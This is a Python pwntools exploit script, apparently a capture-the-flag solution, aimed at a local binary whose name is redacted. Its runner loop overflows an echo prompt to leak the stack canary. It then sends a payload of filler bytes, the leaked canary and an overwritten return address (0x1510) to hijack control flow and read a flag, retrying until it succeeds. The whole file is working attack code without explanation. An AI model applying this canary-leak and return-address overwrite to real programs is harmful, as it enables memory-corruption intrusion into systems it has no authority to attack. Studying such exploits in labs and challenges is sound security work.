#!/usr/bin/python3
from pwn import *
from time import sleep

context.binary = binary = ELF("???", checksec=False)
context.log_level = "critical"
pack=make_packer("all")

def exploit(p, canary):
    shellcode = bytes.fromhex("41" * 280)
    shellcode += pack(int(canary, 16))
    shellcode += bytes.fromhex("41" * 8)
    shellcode += pack(0x1510)
    size = bytes(str(int(len(shellcode))), encoding="utf-8")
    p.recv()
    p.sendline(size)
    p.recv()
    p.sendline(shellcode)
    p.recvline_regex(b"???")
    ret = p.recv()
    if b"flag" in ret:
        return ret.split(b"???")[-1].decode()
    else:
        return None

def runner():
    p = process()
    i = 9
    while i < 281:
        shellcode = pack(int.from_bytes(b"???", byteorder="little"))
        shellcode += bytes.fromhex("41" * (i-len(shellcode)))
        size = bytes(str(int(len(shellcode))),encoding="utf-8")
        
        p.recv()
        p.sendline(size)
        p.recv()
        p.sendline(shellcode)

        ret = p.recvline_regex(b"You said:").split(b"said: ")[-1][i:]
        ret = hex(int.from_bytes(ret, byteorder="little"))
        if not ret.startswith("0x7f") and len(ret) >= 16:
            if len(ret) > 16:
                print("[!] large value found, condensing:", ret)
                ret = "0x" + ret[-14:]
            print("[+] likely canary:", ret + "00")
            ret = exploit(p, ret + "00")
            p.close()
            p.kill()
            return ret
        i += 8

counter = 0
while True:
    result = runner()
    if result != None:
        print(f"Exploited after {counter} tries..")
        print(result)
        break
    else:
        counter += 1
